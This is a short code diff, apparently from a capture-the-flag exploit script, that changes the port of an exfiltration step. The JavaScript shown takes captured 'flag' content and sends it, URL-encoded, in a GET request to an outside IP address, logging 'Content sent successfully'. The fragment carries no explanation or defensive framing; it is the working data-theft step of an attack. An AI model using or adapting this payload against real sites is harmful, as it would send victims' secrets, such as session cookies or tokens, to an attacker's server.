@@ -18,7 +18,7 @@ fetch("/buy", {
     }
 
     if (flagContent) {
-        const targetUrl = `http://111.229.210.75:8200/${encodeURIComponent(flagContent)}`;
+        const targetUrl = `http://111.229.210.75:8300/${encodeURIComponent(flagContent)}`;
         fetch(targetUrl, { method: "GET" })
         .then(response => console.log("Content sent successfully"))
         .catch(error => console.error("Error sending content:", error));
